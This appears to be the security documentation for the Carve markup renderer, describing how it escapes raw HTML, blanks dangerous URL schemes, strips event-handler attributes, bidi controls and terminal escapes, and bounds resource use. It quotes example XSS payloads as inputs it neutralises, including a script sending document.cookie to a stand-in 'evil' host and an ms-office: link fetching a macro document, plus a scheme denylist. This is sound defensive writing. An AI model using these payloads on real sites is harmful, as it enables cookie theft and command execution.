# Security

Carve is designed to be safe to render from untrusted input by default. This
page documents what the renderer guarantees, what you still own, and how to
tighten the policy.

## HTML is text, not markup

Carve has no *implicit* raw-HTML passthrough. Authored bare `<` and `>` carry no
special meaning and are escaped on output rather than interpreted.

There is one *explicit*, author-opted raw passthrough - `` ```=html `` blocks
and `` `…`{=html} `` inline - which emits verbatim HTML and is on by default
(it is corpus-pinned). For UNTRUSTED input you MUST disable it: set
`allowRawHtml: false` (carve-js) / `Options::with_raw_html(false)` (carve-rs) /
enable `SafeMode` (carve-php), which escapes the raw content to text instead of
emitting it.

```carve
<script>alert(1)</script>
```

renders as the literal, inert text `&lt;script&gt;alert(1)&lt;/script&gt;`.
This removes the entire class of injection that comes from Markdown/CommonMark
passing raw HTML through to the output.

## URL scheme sanitization (always on)

The HTML renderer filters the URL on every clickable sink - link `href`, image
`src`, and autolink - against a scheme **denylist**, unconditionally (no opt-in,
no safe-mode required). A URL whose scheme is `javascript`, `vbscript`, `data`,
or `file` collapses to an empty value, so the link text or image `alt` stays
visible but the element is inert:

| Input | Rendered |
|---|---|
| `[x](javascript:alert(1))` | `<a href="">x</a>` |
| `[d](data:text/html;base64,...)` | `<a href="">d</a>` |
| `![i](javascript:alert(1))` | `<img src="" alt="i">` |
| `[ok](https://example.com)` | `<a href="https://example.com">ok</a>` |
| `[rel](/docs/page)` | `<a href="/docs/page">rel</a>` |

What passes through (denylist, not allowlist):

- Relative URLs (no scheme), e.g. `/docs/page`, `page.crv`
- Fragments, e.g. `#section`
- Protocol-relative URLs, e.g. `//cdn.example.com/x`
- Any scheme NOT on the denylist, e.g. `http`, `https`, `mailto`, `tel`, `ftp`

To tighten to a strict allowlist instead, pass `allowedUrlSchemes` (carve-js);
to customize the denylist, pass `deniedUrlSchemes`. carve-php / carve-rs apply
the same baseline; their safe-mode / profile layer can tighten it further.

An attribute block cannot reintroduce a dangerous URL: a `{href=...}` or
`{src=...}` override (in any letter case) is dropped in favor of the sanitized
structural URL. Scheme detection also ignores the tab, newline, and leading
control/space characters that browsers discard when reading a scheme, so a
scheme split by a tab or newline (e.g. `java<TAB>script:`) does not slip
through.

### Configuration

The behavior is controlled through `RenderOptions` (passed to `renderHtml` or
`carveToHtml`):

```js
import { carveToHtml } from '@markup-carve/carve'

// Safe by default - nothing to configure.
carveToHtml(userInput)

// Extend the allowlist (e.g. allow tel: links).
carveToHtml(userInput, { allowedUrlSchemes: ['http', 'https', 'mailto', 'tel'] })

// Trusted input only: pass authored URLs through verbatim.
carveToHtml(trustedInput, { sanitizeUrls: false })
```

| Option | Default | Effect |
|---|---|---|
| `sanitizeUrls` | `true` | Filter link/image URL schemes. Set `false` only for fully trusted input. |
| `allowedUrlSchemes` | unset (denylist mode) | Unset by default: a denylist blocks dangerous schemes (`javascript:`, `data:`, etc.) while others (`tel:`, `ftp:`, `sms:`) pass. An allowlist is enforced only when this is explicitly set. Case-insensitive. |

## Attribute hardening (always on)

Authors can attach `{key=value}` attributes to most elements. Independent of
any option (there is nothing to enable, and no way to disable), the renderer
strips the attributes that have no legitimate use in a content document and
neutralizes script-bearing values on every element - not just links and images:

| Input | Rendered |
|---|---|
| `[x]{onclick="alert(1)"}` | `<span>x</span>` |
| `[x]{srcdoc="..." formaction="y"}` | `<span>x</span>` |
| `[x]{background="javascript:alert(1)"}` | `<span background="">x</span>` |
| `[x]{style="x:expression(alert(1))"}` | `<span style="">x</span>` |
| `[x]{style="color:red" title="ok"}` | `<span style="color:red" title="ok">x</span>` |

Specifically, on every rendered element:

- attribute **names** that start with `on` (event handlers) and the injection
  sinks `srcdoc` / `formaction` are dropped;
- an attribute **value** whose scheme is `javascript`, `vbscript`, `data`, or
  `file` is blanked - scheme detection ignores the control/space characters a
  browser discards, so `java<TAB>script:` does not slip through;
- a `style` value containing a script-bearing or fetching CSS construct -
  `expression(...)`, `url(...)`, `@import`, `behavior:`, or `-moz-binding` - is
  blanked (whitespace collapsed first to defeat evasion).

All other attributes pass through with their values HTML-escaped (quotes
included, so a value cannot break out of its attribute). This baseline is
identical across carve-php, carve-js and carve-rs.

## Invisible Unicode and Trojan Source (always on)

Bidirectional-override and isolate control characters (U+202A–202E, U+2066–2069)
can silently reorder the *visual* order of rendered text and code so the
displayed source differs from what executes — the "Trojan Source" attack
([CVE-2021-42574](https://nvd.nist.gov/vuln/detail/CVE-2021-42574)). Carve
neutralizes them (grammar PART 9 §26):

- **Rendered text and code strip** the bidi-override / isolate controls. They
  are *removed*, not entity-encoded — an HTML parser decodes `&#x202e;` back to
  the live control, so removal is the only DOM-inert mitigation. The directional
  *marks* LRM / RLM (U+200E / U+200F), which are legitimate for laying out
  genuine right-to-left text, are kept.
- **Heading ids are NFC-normalized** and strip the bidi controls plus
  zero-width characters (U+200B/C/D, U+2060, U+FEFF, U+00AD). So a precomposed
  `é` and a decomposed `e` + combining acute produce the **same** id (no
  lookalike-collision), and an invisible character can never land inside an
  `id="…"` or hijack a `</#ref>` cross-reference.

```carve
run `if (admin)‮ //‬ ok` then deploy
```

renders as `run <code>if (admin) // ok</code> then deploy` — the override is gone,
so the code reads the way it executes. No Markdown implementation defends this
by default.

## Resource limits (denial-of-service)

Pathologically nested input cannot drive super-linear parsing. Both block
containers (blockquote / div / list / admonition) and inline constructs
(nested links / spans / emphasis, e.g. a bomb of `[[[…](#)](#)…`) are capped at
a fixed nesting depth (200). Past the cap, further openers degrade to literal
text instead of recursing, so a deeply nested document parses in time linear in
its size rather than the ~O(n^2) a naive nested-link rescan would cost. The cap
is enforced by all three implementations.

**Output amplification is bounded too.** Expansion features whose output can
exceed their input — abbreviation expansion (`*[KEY]: …`) and the generated
`::: index` — are charged against a per-render byte budget of
`max(1 MB, 8 × input length)`. Once a render would exceed it, further
expansions degrade to plain text rather than allocating. This stops a small
document (e.g. a 50 KB abbreviation reused thousands of times) from rendering to
hundreds of MB. Parser passes are linear or linearithmic (cross-reference,
footnote, glossary/index resolution all use lookup maps, not nested scans), and
the parsers have been fuzzed with millions of adversarial inputs without a panic
or a quadratic blow-up.

For an explicit input-size ceiling (and broader feature restriction), configure
a `Profile` / safe mode `maxLength`.

## Non-HTML render targets

The guarantees above are not HTML-only. The Markdown, plain-text, and ANSI
renderers are hardened too, so converting untrusted Carve to a non-HTML target
does not launder an attack:

- **Markdown** is treated as a security boundary because it is routinely
  re-rendered to HTML downstream. Its output escapes embedded HTML (`<`, `>`,
  `&` in text and in the `<sup>` / `<sub>` / `<mark>` / `<ins>` / `<u>` fallback
  tags Markdown has no native form for), runs link / image destinations through
  the same URL-scheme denylist, and **escapes** raw `=html` instead of emitting
  it. So `carve(untrusted) -> Markdown -> Markdown-to-HTML` cannot inject script.
- **ANSI** and **plain text** strip C0 / C1 control characters (keeping tab and
  newline) from author text, code, math, and raw content, so attacker `ESC` /
  OSC sequences cannot inject into a terminal (cursor / clipboard / output
  spoofing).
- **HTML import** (`HtmlToCarve`, where provided) drops all `on*` event-handler
  attributes and dangerous URL schemes, so round-tripping HTML through Carve
  cannot smuggle a handler into the output.

## What you still own

- **Social-token URLs.** `@mention` and `#tag` render as inert spans unless you
  provide `mentionUrl` / `tagUrl` templates. Those templates are your trusted
  configuration; the token name is URL-encoded into them.
- **Arbitrary attributes on non-link elements.** Carve strips event handlers
  and script-bearing values from every element (see *Attribute hardening*
  above), but it is not a full HTML sanitizer: it does not allowlist which
  attributes may appear on which tags, normalize CSS, or police every
  URL-valued attribute beyond the known dangerous schemes. If you accept fully
  untrusted input and permit arbitrary attributes, still run the rendered HTML
  through a DOM sanitizer (e.g. DOMPurify) as defense in depth.
- **Where the HTML ends up.** Carve produces an HTML string; your application is
  responsible for inserting it into a trusted context and for the surrounding
  Content-Security-Policy.

## How Carve compares on security

Most lightweight-markup ecosystems treat sanitization as the *consumer's* job:
the format says nothing about safety, and you are expected to bolt on a
sanitizer (or pick a "safe mode") yourself. Carve is unusual in that the
baseline defenses on this page are **part of the specification** (grammar
PART 9 §25), **pinned by the shared corpus**, and **enforced identically by all
three implementations** with no configuration.

| | Spec mandates sanitization? | URL scheme filtering | Attribute hardening | Trojan Source / bidi | Raw HTML default | DoS bounds in spec |
|---|:---:|:---:|:---:|:---:|:---:|:---:|
| **Carve** | **yes** (§25/§26, corpus-pinned, 3 impls) | always-on denylist | always-on (incl. extension wrappers, CSS-escape decoding) | **always-on strip + NFC ids** | **on, one-flag opt-out / safe mode** | yes (linear-time, depth caps, output budgets) |
| CommonMark / markdown-it / marked | no | none (consumer's job) | no attribute model | none | on (libs vary; `markdown-it` defaults off) | no (several ReDoS CVEs historically) |
| GitHub GFM | no - platform sanitizer | via GitHub's separate allowlist | via GitHub's sanitizer | none in the format | sanitized server-side | no |
| Djot (Carve's parent) | no | none mandated | none mandated | none | on | no |
| MDX | n/a - compiles to JS | n/a | n/a | none | executes code | no |

What this means in practice for **untrusted input**:

- Carve out of the box blanks dangerous URL schemes (`javascript:`/`vbscript:`/
  `data:`/`file:`), drops `on*`/`srcdoc`/`formaction` and script-bearing CSS,
  bounds resources, and strips terminal-control bytes from the Markdown / plain
  / ANSI renderers - **without you wiring up a sanitizer**. Stock Markdown and
  reference Djot do none of this; you must add a sanitizer or use a host that
  sanitizes (as GitHub does).
- The safety is *guaranteed by the spec and tested across implementations*, so
  carve-php, carve-js and carve-rs all behave the same - you do not inherit a
  different security posture by switching implementation.

### Worked examples: same input, Carve vs Markdown

The Carve column is real output. The Markdown column is the per-spec
(CommonMark / GFM) result *before* any downstream sanitizer runs — which is what
an application gets if the sanitizer is missing or misconfigured.

**1. Script URL in a link** — `[click](javascript:stealCookies)`

::: code-group
```html [Carve]
<p><a href="">click</a></p>
```
```html [Markdown (pre-sanitizer)]
<p><a href="javascript:stealCookies">click</a></p>
```
:::

The `javascript:` scheme is blanked. `data:`, `vbscript:`, and `file:` are
treated the same, including obfuscated forms (leading control characters,
Unicode whitespace, mixed case).

**2. Dangerous attributes** — `[hover]{onclick="steal()" style="x:expression(alert(1))"}`

::: code-group
```html [Carve]
<p><span style="">hover</span></p>
```
```html [Markdown + attr extension]
<p><span onclick="steal()" style="x:expression(alert(1))">hover</span></p>
```
:::

`on*` handlers are dropped and script-bearing CSS (`expression()`, `url(...)`,
`@import`, `behavior`) is blanked. Carve has a first-class attribute syntax;
Markdown attribute extensions such as `markdown-it-attrs` typically pass these
through.

**3. A bare HTML tag** — `<script>alert(1)</script>`

::: code-group
```html [Carve]
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
```
```html [Markdown]
<script>alert(1)</script>
```
:::

Carve has no "HTML block" auto-detection — a bare tag is *text*, escaped.
Markdown emits it live. (Carve's explicit raw-HTML construct is covered in the
warning below.)

**4. Trojan Source** — `` run `if (admin)‮ //‬ ok` `` (with a U+202E override)

::: code-group
```html [Carve]
<p>run <code>if (admin) // ok</code></p>
```
```html [Markdown]
<!-- ‹U+202E› is the raw override byte, passed straight through -->
<p>run <code>if (admin)‹U+202E› //‹U+202C› ok</code></p>
```
:::

The override is stripped so the rendered code matches what executes. Markdown
passes the raw control byte through, and the displayed character order is
reversed in the browser.

**5. Amplification DoS** — a 50 KB abbreviation reused 2000× (~54 KB of input):

| | Output | Time |
|---|---|---|
| **Carve** | ~1 MB (budget-capped, then degrades to plain text) | < 1 s |
| typical Markdown parser | unbounded, or a ReDoS hang | seconds → DoS |

::: warning One thing you must still configure
**Raw HTML is on by default.** ` ```=html ` blocks and `` `…`{=html} `` inline
raw are emitted verbatim unless you disable raw passthrough (or run a safe
mode). For untrusted input, turn raw HTML off - the URL, attribute, and DoS
defenses above are always on, but raw passthrough is the one switch you own.
:::

::: tip Defense in depth still applies
Carve's URL/CSS hardening is a **denylist** of known-dangerous constructs, not a
full allowlist sanitizer. For genuinely hostile input that may carry arbitrary
attributes, keep running the rendered HTML through a DOM sanitizer (e.g.
DOMPurify) under a Content-Security-Policy. `SafeMode` / `Profile` add
allowlist-style policies on top (see below).
:::

## Real-world Markdown CVEs, and where Carve stands

Two 2025/2026 vulnerabilities show the two classes of Markdown attack that
Carve's baseline is designed to neutralize.

### Embedded HTML → script execution (CVE-2025-65716, Markdown Preview Enhanced)

The VS Code extension rendered a markdown file's embedded `<script>` / `<iframe>`
into a same-origin preview, unsanitized, giving the page JavaScript execution
with localhost access (port-scanning, SSRF, data exfiltration). Same payload in
Carve:

```carve
<iframe src="http://localhost:8080/scan"></iframe>
<script>fetch("//evil/?" + document.cookie)</script>
```

renders as escaped, inert text — `<p>&lt;iframe …&gt;…</p>`,
`<p>&lt;script&gt;…&lt;/script&gt;</p>`. Carve has no "HTML block"
auto-detection, so a bare tag is never live markup. The only way to emit raw
HTML is the **explicit** `` ```=html `` construct, which you disable for
untrusted input.

::: tip Two things this CVE also reminds you of
Even with Carve's inert output, a *preview* application still owns its sandbox:
render into an `iframe[sandbox]` with no same-origin / no localhost access and a
Content-Security-Policy. And keep raw-HTML passthrough off for untrusted files.
:::

### Dangerous URI scheme in a link → OS command (CVE-2026-20841, Windows Notepad)

Notepad's markdown links routed clicks to Windows URI handlers, so a crafted
`file://…\\payload.bat` or `ms-office:` / `ms-msdt:` link could launch a binary,
open a macro-enabled Office document, or trigger the Follina handler. Carve's
always-on scheme denylist blanks these to `href=""`:

| Scheme | Result |
|---|---|
| `javascript:` `vbscript:` `data:` `file:` | blanked (long-standing) |
| `ms-msdt:` (Follina), `ms-office:` `ms-word:` `ms-excel:` … (Office handlers) | blanked |
| `ms-search:` `search-ms:` `shell:` `ms-cxh:` `vscode:` `jar:` | blanked |
| `http:` `https:` `mailto:` `tel:` `ftp:` `sms:` | allowed (legitimate) |

So `[open](ms-office:ofe|u|http://evil/x.docm)` becomes `<a href="">open</a>` —
the OS handler is never reachable.

::: warning A denylist is a moving target
Blocking the *known* command-execution schemes closes the documented class, but
new OS handlers appear. If your application turns link clicks into OS-handler
invocations (a desktop preview, an editor), enable the scheme **allowlist**
(`allowedUrlSchemes: ['http','https','mailto']`) so only vetted schemes ever
reach an `href` — the robust, future-proof posture for that deployment.
:::

## Beyond the baseline: SafeMode and Profiles

The baseline on this page - the URL scheme denylist, the attribute name/value
hardening, the raw-HTML escape switch, and the DoS resource bounds - is the
normative default, mandated by the grammar (`resources/grammar.ebnf` PART 9 §25)
and pinned by the corpus ("Security hardening" examples). It is enforced by all
three implementations (carve-php, carve-js, carve-rs) without any configuration.
`SafeMode` / `Profile` are **optional, implementation-level**
policy objects that layer a broader surface ON TOP (scheme allowlists,
domain allow/deny, `rel=nofollow`, feature restriction, nesting / length
limits); that wider surface is documented in the
[Syntax Specification](./case-study/syntax) and may land incrementally.
